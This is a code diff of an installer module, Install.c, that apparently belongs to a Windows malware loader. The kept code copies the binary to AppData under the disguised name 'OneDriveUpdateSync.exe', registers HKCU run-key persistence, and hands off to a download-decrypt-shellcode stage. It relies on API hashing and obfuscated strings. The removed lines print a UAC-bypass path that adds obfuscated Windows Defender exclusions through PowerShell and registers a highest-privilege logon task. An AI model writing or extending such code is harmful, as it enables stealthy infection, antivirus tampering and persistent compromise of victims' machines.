@@ -1,33 +1,23 @@
 // =============================================
-// Install.c  -  File copy + launch + self-terminate
+// Install.c  -  File copy + persistence install
 //
-// InstallAndTerminate  (all EXE builds):
-//   1. Detect if already persistence copy (basename == msoia.exe) → return
+// InstallAndContinue  (all EXE builds):
+//   1. Detect if already persistence copy (basename == OneDriveUpdateSync.exe) → return
+//      (caller continues to download → decrypt → shellcode)
 //   2. GetEnvironmentVariableA("APPDATA") → build dest path
 //   3. CreateDirectoryA for each intermediate level
-//   [UAC only]
-//     4. RunWdExclude: elevated PS → Add-MpPreference + Register-ScheduledTask
-//     5. Sleep(8000): wait for PS exclusions
-//   6. CopyFileA self → msoia.exe
-//   [UAC only]
-//     7. RunTaskViaCom → launch task immediately
-//   [non-UAC]
-//     7. CreateProcessW(msoia.exe) → launch directly
-//   8. NtTerminateProcess(self)
+//   4. CopyFileA self → OneDriveUpdateSync.exe
+//   5. InstallPersistence → HKCU run-key
+//   6. NtTerminateProcess(self) — OS fires run key at next logon
 //
 // SideloadInstallAndContinue  (all BUILD_DLL builds):
 //   1. Detect if persistence reboot (/pf in command line) → return
+//      (caller continues to download → decrypt → shellcode)
 //   2. Build dest path + create dirs
-//   3. CopyFileA host EXE → msoia.exe
+//   3. CopyFileA host EXE → OneDriveUpdateSync.exe
 //   4. CopyFileA *.dll → dest dir
-//   [UAC only]
-//     5. RunWdExclude + Sleep + RunTaskViaCom
-//   [non-UAC]
-//     5. CreateProcessW(msoia.exe /pf) → launch directly
-//   6. NtTerminateProcess(self)
-//
-// AMSI note: copy done in C after PS sets exclusions (UAC builds) so AMSI
-// in the PS child cannot block Copy-Item.
+//   5. InstallPersistence → HKCU run-key
+//   6. NtTerminateProcess(self) — OS fires run key at next logon
 // =============================================
 
 #include "Common.h"
@@ -48,9 +38,7 @@ typedef DWORD    (WINAPI* fnGetEnvVarA)(LPCSTR, LPSTR, DWORD);
 typedef BOOL     (WINAPI* fnCreateDirA)(LPCSTR, LPSECURITY_ATTRIBUTES);
 typedef BOOL     (WINAPI* fnCopyFileA3)(LPCSTR, LPCSTR, BOOL);
 typedef DWORD    (WINAPI* fnGetModA)   (HMODULE, LPSTR, DWORD);
-typedef VOID     (WINAPI* fnSleepA)   (DWORD);
 typedef NTSTATUS (NTAPI*  fnNtTerm2)  (HANDLE, NTSTATUS);
-typedef BOOL     (WINAPI* fnCreateProcW)(LPCWSTR, LPWSTR, PVOID, PVOID, BOOL, DWORD, PVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
 
 // Find* typedefs needed by SideloadInstallAndContinue (all sideload builds)
 #ifdef BUILD_DLL
@@ -61,144 +49,9 @@ typedef BOOL   (WINAPI* fnFindCloseA) (HANDLE);
 #endif
 
 // =============================================
-// UAC-only helper functions
+// InstallAndContinue — all EXE builds
 // =============================================
-#ifdef UAC_BYPASS
-
-
-static VOID RunTaskViaCom(IN PAPI_HASHING pApi, IN LPCSTR szTaskName) {
-    typedef struct { WORD vt; WORD r[3]; LONGLONG v; } CVAR;
-    typedef HRESULT (WINAPI* fnCoInitEx)    (PVOID, DWORD);
-    typedef HRESULT (WINAPI* fnCoCrInst)    (const GUID*, PVOID, DWORD, const GUID*, PVOID*);
-    typedef BSTR    (WINAPI* fnSysAlloc)    (LPCWSTR);
-    typedef void    (WINAPI* fnSysFree)     (BSTR);
-    typedef ULONG   (__stdcall* fnRelease)  (void*);
-    typedef HRESULT (__stdcall* fnConnect)  (void*, CVAR, CVAR, CVAR, CVAR);
-    typedef HRESULT (__stdcall* fnGetFolder)(void*, BSTR, void**);
-    typedef HRESULT (__stdcall* fnGetTask)  (void*, BSTR, void**);
-    typedef HRESULT (__stdcall* fnRunTask)  (void*, CVAR, void**);
-
-    HMODULE hOle32  = pApi->pLoadLibraryA("ole32.dll");
-    HMODULE hOleAut = pApi->pLoadLibraryA("oleaut32.dll");
-    if (!hOle32 || !hOleAut) { LOG("[!] RunTaskViaCom: load failed"); return; }
-
-    fnCoInitEx pCoInit = (fnCoInitEx)pApi->pGetProcAddress(hOle32,  "CoInitializeEx");
-    fnCoCrInst pCoCI   = (fnCoCrInst)pApi->pGetProcAddress(hOle32,  "CoCreateInstance");
-    fnSysAlloc pSAS    = (fnSysAlloc)pApi->pGetProcAddress(hOleAut, "SysAllocString");
-    fnSysFree  pSFS    = (fnSysFree) pApi->pGetProcAddress(hOleAut, "SysFreeString");
-    if (!pCoInit || !pCoCI || !pSAS || !pSFS) { LOG("[!] RunTaskViaCom: API failed"); return; }
-
-    pCoInit(NULL, 0);
-    static const GUID CLSID_TS = {0x0f87369f,0xa4e5,0x4cfc,{0xbd,0x3e,0x73,0xe6,0x15,0x45,0x72,0xdd}};
-    static const GUID IID_ITS  = {0x2faba4c7,0x4da9,0x4013,{0x96,0x97,0x20,0xcc,0x3f,0xd4,0x0f,0x85}};
-
-    void* pSvc = NULL;
-    if (FAILED(pCoCI(&CLSID_TS, NULL, 0x17, &IID_ITS, &pSvc)) || !pSvc) {
-        LOG("[!] RunTaskViaCom: CoCreateInstance failed"); return;
-    }
-
-#define VT(obj,n) ((void**)*(void**)(obj))[(n)]
-    CVAR vE; MemSet(&vE, 0, sizeof(vE));
-    HRESULT hr;
-
-    hr = ((fnConnect)VT(pSvc,10))(pSvc, vE, vE, vE, vE);
-    if (FAILED(hr)) { goto rel_svc; }
-
-    BSTR bRoot = pSAS(L"\\");
-    void* pFolder = NULL;
-    hr = ((fnGetFolder)VT(pSvc,7))(pSvc, bRoot, &pFolder);
-    pSFS(bRoot);
-    if (FAILED(hr) || !pFolder) { goto rel_svc; }
-
-    WCHAR wName[128]; MemSet(wName, 0, sizeof(wName));
-    for (SIZE_T i = 0; szTaskName[i] && i < 127; i++) wName[i] = (WCHAR)(UCHAR)szTaskName[i];
-
-    BSTR bTask = pSAS(wName);
-    void* pTask = NULL;
-    hr = ((fnGetTask)VT(pFolder,13))(pFolder, bTask, &pTask);
-    pSFS(bTask);
-    if (FAILED(hr) || !pTask) { goto rel_folder; }
-
-    ((fnRunTask)VT(pTask,12))(pTask, vE, NULL);
-    ((fnRelease)VT(pTask,2))(pTask);
-
-rel_folder:
-    ((fnRelease)VT(pFolder,2))(pFolder);
-rel_svc:
-    ((fnRelease)VT(pSvc,2))(pSvc);
-#undef VT
-}
-
-static VOID RunWdExclude(IN PAPI_HASHING pApi, IN PVOID pNtdll, IN PVOID pK32,
-                         IN LPCSTR szDestDir, IN LPCSTR szDestExe) {
-    static WCHAR wFinal[3200];
-    SIZE_T fpos = 0;
-    MemSet(wFinal, 0, sizeof(wFinal));
-
-#define FA(s) do { const CHAR* _s=(const CHAR*)(s); for(SIZE_T _i=0; _s[_i] && fpos<3190; _i++) wFinal[fpos++]=(WCHAR)(UCHAR)_s[_i]; } while(0)
-#define FW(w) do { const WCHAR* _w=(w); for(SIZE_T _i=0; _w[_i] && fpos<3190; _i++) wFinal[fpos++]=_w[_i]; } while(0)
-
-    // Prefix: <sysdir>\cmd.exe /c  (already elevated as --install child)
-    {
-        typedef DWORD (WINAPI* fnGSD2)(LPWSTR, UINT);
-        fnGSD2 pGSD = (fnGSD2)FetchExportAddress(pK32, GetSystemDirectoryW_JOAAT);
-        WCHAR wSysDir[MAX_PATH] = {0};
-        if (pGSD) { pGSD(wSysDir, MAX_PATH); for (SIZE_T _i = 0; wSysDir[_i] && fpos < 3190; _i++) wFinal[fpos++] = wSysDir[_i]; FW(L"\\cmd.exe /c "); }
-        else { FW(L"cmd.exe /c "); }
-    }
-
-    // Scheduled task registration (always) + WD exclusions (ENABLE_WD_EXCL only).
-    // Register-ScheduledTask replaces schtasks to suppress default AC-power conditions.
-    BYTE xValName[] = XSTR_STARTUP_VALUE_NAME; DEOBF(xValName);
-    FW(L"powershell -Command \"");
-#ifdef ENABLE_WD_EXCL
-    {
-        BYTE xPName[]   = XSTR_PERSIST_EXE_NAME; DEOBF(xPName);
-        BYTE xDllName[] = XSTR_PERSIST_DLL_NAME; DEOBF(xDllName);
-        BYTE xInjName[] = XSTR_INJECT_NAME;      DEOBF(xInjName);
-        CHAR szDestDll[MAX_PATH] = {0};
-        Ins_ACpy(szDestDll, szDestDir, MAX_PATH);
-        Ins_ACat(szDestDll, (CHAR*)xDllName, MAX_PATH);
-        FW(L"$c='Add-'+'MpPref'+'erence';$h=@{ExclusionPath=@('");
-        FA(szDestExe);
-        FW(L"','"); FA(szDestDll);
-        FW(L"');ExclusionProcess=@('"); FA((CHAR*)xPName);
-        FW(L"','"); FA((CHAR*)xInjName);
-        FW(L"')};&$c @h;");
-    }
-#endif /* ENABLE_WD_EXCL */
-    FW(L"$a=New-ScheduledTaskAction -Execute '"); FA(szDestExe); FW(L"';");
-    FW(L"$t=New-ScheduledTaskTrigger -AtLogOn;");
-    FW(L"$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;");
-    FW(L"$p=New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest -LogonType Interactive;");
-    FW(L"Register-ScheduledTask -TaskName '"); FA((CHAR*)xValName);
-    FW(L"' -Action $a -Trigger $t -Settings $s -Principal $p -Force\"");
-
-#undef FA
-#undef FW
-    wFinal[fpos] = 0;
-
-    // Spawn cmd.exe directly — no AppInfo bypass needed, already elevated
-    typedef BOOL (WINAPI* fnCPW2)(LPCWSTR, LPWSTR, PVOID, PVOID, BOOL, DWORD, PVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
-    typedef BOOL (WINAPI* fnClH2)(HANDLE);
-    fnCPW2 pCPW = (fnCPW2)FetchExportAddress(pK32, CreateProcessW_JOAAT);
-    fnClH2 pClH = (fnClH2)FetchExportAddress(pK32, CloseHandle_JOAAT);
-    if (!pCPW) { LOG("[!] RunWdExclude: CreateProcessW not found"); return; }
-    STARTUPINFOW si = {0}; PROCESS_INFORMATION pi = {0};
-    si.cb = sizeof(si); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
-    LOG("[*] Install: launching WD excl + scheduled task via cmd.exe...");
-    if (pCPW(NULL, wFinal, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-        LOG("[+] RunWdExclude: cmd.exe spawned");
-        if (pClH) { pClH(pi.hThread); pClH(pi.hProcess); }
-    } else { LOG("[!] RunWdExclude: cmd.exe failed"); }
-}
-
-#endif /* UAC_BYPASS */
-
-// =============================================
-// InstallAndTerminate — all EXE builds
-// =============================================
-VOID InstallAndTerminate(IN PAPI_HASHING pApi) {
+VOID InstallAndContinue(IN PAPI_HASHING pApi) {
     PVOID pK32   = FindLoadedModuleW(L"KERNEL32.DLL");
     PVOID pNtdll = FindLoadedModuleW(L"NTDLL.DLL");
     if (!pK32 || !pNtdll) return;
@@ -210,13 +63,8 @@ VOID InstallAndTerminate(IN PAPI_HASHING pApi) {
     fnCreateDirA   pMkDir    = (fnCreateDirA)  pApi->pGetProcAddress((HMODULE)pK32, (LPCSTR)xMkDir);
     fnCopyFileA3   pCpFile   = (fnCopyFileA3)  pApi->pGetProcAddress((HMODULE)pK32, (LPCSTR)xCpFile);
     fnGetModA      pGetModA  = (fnGetModA)     FetchExportAddress(pK32,  GetModuleFileNameA_JOAAT);
-    fnNtTerm2      pNtTerm   = (fnNtTerm2)     FetchExportAddress(pNtdll, NtTerminateProcess_JOAAT);
-    fnCreateProcW  pCrProcW  = (fnCreateProcW) FetchExportAddress(pK32,  CreateProcessW_JOAAT);
-#ifdef UAC_BYPASS
-    fnSleepA       pSleep    = (fnSleepA)      FetchExportAddress(pK32,  Sleep_JOAAT);
-#endif
 
-    if (!pGetEnv || !pMkDir || !pCpFile || !pGetModA || !pNtTerm) {
+    if (!pGetEnv || !pMkDir || !pCpFile || !pGetModA) {
         LOG("[!] Install: API resolution failed");
         return;
     }
@@ -243,7 +91,7 @@ VOID InstallAndTerminate(IN PAPI_HASHING pApi) {
     }
     LOG("[+] Install: directory tree ensured");
 
-    // 3. Build dest EXE path
+    // 3. Build dest EXE path (not used in this path but kept for self-guard)
     CHAR szDestExe[MAX_PATH] = {0};
     Ins_ACpy(szDestExe, szDestDir, MAX_PATH);
     BYTE xPName[] = XSTR_PERSIST_EXE_NAME; DEOBF(xPName);
@@ -256,7 +104,7 @@ VOID InstallAndTerminate(IN PAPI_HASHING pApi) {
         return;
     }
 
-    // 5. Self-guard: if already the persistence copy (same check as UAC's IsFirstRunProcess),
+    // 5. Self-guard: if already the persistence copy,
     //    skip install and return to continue shellcode execution.
     {
         SIZE_T len = Ins_ALen(szSrcExe);
@@ -277,11 +125,6 @@ VOID InstallAndTerminate(IN PAPI_HASHING pApi) {
         }
     }
 
-// #ifdef UAC_BYPASS
-//     RunWdExclude(pApi, pNtdll, pK32, szDestDir, szDestExe);
-//     if (pSleep) pSleep(8000);
-// #endif
-
     // 6. Copy EXE
     if (!pCpFile(szSrcExe, szDestExe, FALSE)) {
         LOG_HEX("[!] Install: CopyFileA failed, GLE=", GetLastError());
@@ -289,30 +132,13 @@ VOID InstallAndTerminate(IN PAPI_HASHING pApi) {
         LOG("[+] Install: EXE copied to persistence path");
     }
 
-#ifdef UAC_BYPASS
-    // 7a. [UAC] Launch via scheduled task (RunLevel Highest — already registered in PS)
-    {
-        BYTE xVNt[] = XSTR_STARTUP_VALUE_NAME; DEOBF(xVNt);
-        RunTaskViaCom(pApi, (LPCSTR)xVNt);
-    }
-#else
-    // 7b. [non-UAC] Write HKCU run key, then launch the copied EXE directly at same IL
+    // 7. Write HKCU run key + terminate; OS fires the run key at next logon
     InstallPersistence(pApi);
-    if (pCrProcW) {
-        WCHAR wDestExe[MAX_PATH] = {0};
-        for (SIZE_T i = 0; szDestExe[i] && i < MAX_PATH-1; i++)
-            wDestExe[i] = (WCHAR)(UCHAR)szDestExe[i];
-        STARTUPINFOW si = {0}; si.cb = sizeof(si);
-        si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
-        PROCESS_INFORMATION pi = {0};
-        pCrProcW(wDestExe, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
-        LOG("[+] Install: launched persistence copy");
+    LOG("[+] Install: persistence registered, terminating");
+    {
+        fnNtTerm2 pNtTerm = (fnNtTerm2)FetchExportAddress(pNtdll, NtTerminateProcess_JOAAT);
+        if (pNtTerm) pNtTerm((HANDLE)(ULONG_PTR)-1, 0);
     }
-#endif
-
-    // 8. Terminate self
-    LOG("[*] Install: terminating");
-    pNtTerm((HANDLE)(ULONG_PTR)-1, 0);
 }
 
 // =============================================
@@ -325,9 +151,6 @@ VOID SideloadInstallAndContinue(IN PAPI_HASHING pApi) {
     static CHAR  s_szSrcDll[MAX_PATH];
     static CHAR  s_szDstDll[MAX_PATH];
     static CHAR  s_szPattern[MAX_PATH];
-#ifdef UAC_BYPASS
-    static WCHAR wFinal[5700];
-#endif
 
     PVOID pK32   = FindLoadedModuleW(L"KERNEL32.DLL");
     PVOID pNtdll = FindLoadedModuleW(L"NTDLL.DLL");
@@ -346,15 +169,6 @@ VOID SideloadInstallAndContinue(IN PAPI_HASHING pApi) {
     fnFindCloseA  pFC       = (fnFindCloseA) FetchExportAddress(pK32,   FindClose_JOAAT);
     fnNtTerm2     pNtTerm   = (fnNtTerm2)    FetchExportAddress(pNtdll, NtTerminateProcess_JOAAT);
     fnGetCmdLineA pGetCmdA  = (fnGetCmdLineA)FetchExportAddress(pK32,   GetCommandLineA_JOAAT);
-    fnCreateProcW pCrProcW  = (fnCreateProcW)FetchExportAddress(pK32,   CreateProcessW_JOAAT);
-#ifdef UAC_BYPASS
-    fnSleepA      pSleep    = (fnSleepA)     FetchExportAddress(pK32,   Sleep_JOAAT);
-    typedef DWORD (WINAPI* fnGSD2)(LPWSTR, UINT);
-    typedef DWORD (WINAPI* fnGWD2)(LPWSTR, UINT);
-    fnGSD2 pGSD = (fnGSD2)FetchExportAddress(pK32, GetSystemDirectoryW_JOAAT);
-    fnGWD2 pGWD = (fnGWD2)FetchExportAddress(pK32, GetWindowsDirectoryW_JOAAT);
-    if (!pGSD || !pGWD) return;
-#endif
 
     if (!pGetEnv || !pMkDir || !pCpFile || !pGetModA || !pFFF || !pFNF || !pFC || !pNtTerm) {
         LOG("[!] SideloadInstall: API resolution failed");
@@ -362,7 +176,6 @@ VOID SideloadInstallAndContinue(IN PAPI_HASHING pApi) {
     }
 
     // 1. Self-guard: detect persistence reboot via /pf in command line
-    //    (same mechanism as bPersistBoot in Sideload.c for UAC builds)
     if (pGetCmdA) {
         LPCSTR szCmd = pGetCmdA();
         if (szCmd) {
@@ -409,65 +222,14 @@ VOID SideloadInstallAndContinue(IN PAPI_HASHING pApi) {
     BYTE xPName2[] = XSTR_PERSIST_EXE_NAME; DEOBF(xPName2);
     Ins_ACat(szDestExe, (CHAR*)xPName2, MAX_PATH);
 
-#ifdef UAC_BYPASS
-    // 6a. [UAC] Scheduled task (always) + WD exclusions (ENABLE_WD_EXCL only) via elevated PS
-    {
-        // Build cmd.exe chain directly into wFinal — no PowerShell needed
-        SIZE_T fpos = 0;
-        MemSet(wFinal, 0, sizeof(wFinal));
-#define SLA(s) do { const CHAR* _s=(const CHAR*)(s); for(SIZE_T _i=0; _s[_i] && fpos<5690; _i++) wFinal[fpos++]=(WCHAR)(UCHAR)_s[_i]; } while(0)
-#define SLW(w) do { const WCHAR* _w=(w); for(SIZE_T _i=0; _w[_i] && fpos<5690; _i++) wFinal[fpos++]=_w[_i]; } while(0)
-        // Prefix: <sysdir>\cmd.exe /c
-        {
-            WCHAR wSD[MAX_PATH] = {0};
-            if (pGSD) { pGSD(wSD, MAX_PATH); for (SIZE_T _i = 0; wSD[_i] && fpos < 5690; _i++) wFinal[fpos++] = wSD[_i]; SLW(L"\\cmd.exe /c "); }
-            else { SLW(L"cmd.exe /c "); }
-        }
-        // Scheduled task registration (always) + WD exclusions (ENABLE_WD_EXCL only).
-        // Register-ScheduledTask replaces schtasks to suppress default AC-power conditions.
-        { BYTE xVN[] = XSTR_STARTUP_VALUE_NAME; DEOBF(xVN);
-          SLW(L"powershell -Command \"");
-#ifdef ENABLE_WD_EXCL
-          { BYTE xPN3[]  = XSTR_PERSIST_EXE_NAME; DEOBF(xPN3);
-            BYTE xDll3[] = XSTR_PERSIST_DLL_NAME; DEOBF(xDll3);
-            BYTE xInj3[] = XSTR_INJECT_NAME;      DEOBF(xInj3);
-            CHAR szDestDll3[MAX_PATH] = {0};
-            Ins_ACpy(szDestDll3, szDestDir, MAX_PATH);
-            Ins_ACat(szDestDll3, (CHAR*)xDll3, MAX_PATH);
-            SLW(L"$c='Add-'+'MpPref'+'erence';$h=@{ExclusionPath=@('");
-            SLA(szDestExe);
-            SLW(L"','"); SLA(szDestDll3);
-            SLW(L"');ExclusionProcess=@('"); SLA((CHAR*)xPN3);
-            SLW(L"','"); SLA((CHAR*)xInj3);
-            SLW(L"')};&$c @h;");
-          }
-#endif /* ENABLE_WD_EXCL */
-          SLW(L"$a=New-ScheduledTaskAction -Execute '"); SLA(szDestExe); SLW(L"' -Argument '/pf';");
-          SLW(L"$t=New-ScheduledTaskTrigger -AtLogOn;");
-          SLW(L"$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;");
-          SLW(L"$p=New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest -LogonType Interactive;");
-          SLW(L"Register-ScheduledTask -TaskName '"); SLA((CHAR*)xVN);
-          SLW(L"' -Action $a -Trigger $t -Settings $s -Principal $p -Force\""); }
-#undef SLA
-#undef SLW
-        wFinal[fpos] = 0;
-        WCHAR wSysDir[MAX_PATH] = {0};
-        WCHAR wWinDir[MAX_PATH] = {0};
-        pGSD(wSysDir, MAX_PATH); pGWD(wWinDir, MAX_PATH);
-        LOG("[*] SideloadInstall: launching WD excl + scheduled task via AppInfo...");
-        UacRunCommandElevated(pApi, pNtdll, wSysDir, wWinDir, wFinal);
-    }
-    if (pSleep) pSleep(8000);
-#endif /* UAC_BYPASS */
-
-    // 7. Copy host EXE
+    // 6. Copy host EXE
     if (!pCpFile(szSrcExe, szDestExe, FALSE)) {
         LOG("[!] SideloadInstall: CopyFileA (EXE) failed");
     } else {
         LOG("[+] SideloadInstall: EXE copied");
     }
 
-    // 8. Copy all *.dll from source dir
+    // 7. Copy all *.dll from source dir
     Ins_ACpy(s_szPattern, szSrcDir, MAX_PATH);
     { const CHAR szGlob[] = {'*','.','d','l','l',0}; Ins_ACat(s_szPattern, szGlob, MAX_PATH); }
     MemSet(&s_wfd, 0, sizeof(s_wfd));
@@ -486,39 +248,9 @@ VOID SideloadInstallAndContinue(IN PAPI_HASHING pApi) {
         LOG("[+] SideloadInstall: DLLs copied");
     }
 
-#ifdef UAC_BYPASS
-    // 9a. [UAC] Launch via scheduled task
-    {
-        BYTE xVNs[] = XSTR_STARTUP_VALUE_NAME; DEOBF(xVNs);
-        RunTaskViaCom(pApi, (LPCSTR)xVNs);
-        LOG("[+] SideloadInstall: COM task launch requested");
-    }
-#else
-    // 9b. [non-UAC] Write HKCU run key, then launch copied EXE with /pf flag
+    // 8. Write HKCU run key + terminate; OS fires the run key at next logon
     InstallPersistence(pApi);
-    if (pCrProcW) {
-        WCHAR wCmdLine[MAX_PATH + 8] = {0};
-        SIZE_T ci = 0;
-        wCmdLine[ci++] = L'"';
-        for (SIZE_T i = 0; szDestExe[i] && ci < MAX_PATH+1; i++)
-            wCmdLine[ci++] = (WCHAR)(UCHAR)szDestExe[i];
-        wCmdLine[ci++] = L'"';
-        wCmdLine[ci++] = L' '; wCmdLine[ci++] = L'/';
-        wCmdLine[ci++] = L'p'; wCmdLine[ci++] = L'f';
-        wCmdLine[ci]   = 0;
-        WCHAR wDestDirW[MAX_PATH] = {0};
-        for (SIZE_T i = 0; szDestDir[i] && i < MAX_PATH-1; i++)
-            wDestDirW[i] = (WCHAR)(UCHAR)szDestDir[i];
-        STARTUPINFOW si = {0}; si.cb = sizeof(si);
-        si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
-        PROCESS_INFORMATION pi = {0};
-        pCrProcW(NULL, wCmdLine, NULL, NULL, FALSE, 0, NULL, wDestDirW, &si, &pi);
-        LOG("[+] SideloadInstall: launched persistence copy /pf");
-    }
-#endif
-
-    // 10. Terminate self
-    LOG("[*] SideloadInstall: terminating");
+    LOG("[+] SideloadInstall: persistence registered, terminating");
     pNtTerm((HANDLE)(ULONG_PTR)-1, 0);
 }
 
